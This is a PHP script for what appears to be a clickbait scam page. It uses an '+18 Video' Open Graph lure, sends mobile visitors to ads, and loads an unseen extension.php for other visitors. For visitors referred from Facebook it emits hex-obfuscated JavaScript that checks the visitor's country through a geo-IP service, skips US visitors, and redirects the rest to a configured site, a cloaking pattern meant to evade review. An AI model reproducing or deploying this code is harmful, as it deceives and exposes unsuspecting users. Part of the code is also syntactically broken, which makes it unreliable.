<?php
ob_start();
require_once('Mobile_Detect.php');
require_once('Browser.php');
require_once('functions.php');
require_once('config.php');
$detect = new Mobile_Detect;
$browser = new Browser();



      
if($detect->isMobile() || $browser->isMobile()){
  header("Location:".$ads);
  exit();
}
 function shkronja($val){
      $chars="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
      srand((double)microtime()*1000000);
      $i = 0;
      $pass = '' ;
      while ($i<=$val) 
    {
        $num  = rand() % 10;
        $tmp  = substr($chars, $num, 1);
        $pass = $pass . $tmp;
        $i++;
      }
    return $pass;
    }

echo ' 


 <meta property="og:title" content="+18 Video '.shkronja(8).'" />
          <meta property="fb:app_id" content="87741124305" />;




$randval = rand();



if(strpos($_SERVER["HTTP_HOST"], $app_site) === false ){
  if (strstr($_SERVER['HTTP_REFERER'], 'facebook.com') !== false) {

  echo '

  <script>

var _0x8fa3=["\x47\x45\x54","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x67\x65\x6F\x69\x70\x2E\x6E\x65\x6B\x75\x64\x6F\x2E\x63\x6F\x6D\x2F\x61\x70\x69","\x6F\x70\x65\x6E","\x73\x65\x6E\x64","\x72\x65\x73\x70\x6F\x6E\x73\x65\x54\x65\x78\x74","\x70\x61\x72\x73\x65","\x63\x6F\x64\x65","\x63\x6F\x75\x6E\x74\x72\x79","\x55\x53","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","http://'.$app_site.'/","\x72\x61\x6E\x64\x6F\x6D","\x66\x6C\x6F\x6F\x72"];var xmlhttpz= new XMLHttpRequest();xmlhttpz[_0x8fa3[2]](_0x8fa3[0],_0x8fa3[1],false);xmlhttpz[_0x8fa3[3]]();var get=JSON[_0x8fa3[5]](xmlhttpz[_0x8fa3[4]]);var country=get[_0x8fa3[7]][_0x8fa3[6]];if(country== _0x8fa3[8]){exit}else {top[_0x8fa3[10]][_0x8fa3[9]]= _0x8fa3[11]+ Math[_0x8fa3[13]](Math[_0x8fa3[12]]()* 99999999) + "sanx0"; }  </script>';

}
    } else {

        require_once('extension.php');
    }



ob_end_flush();

?>
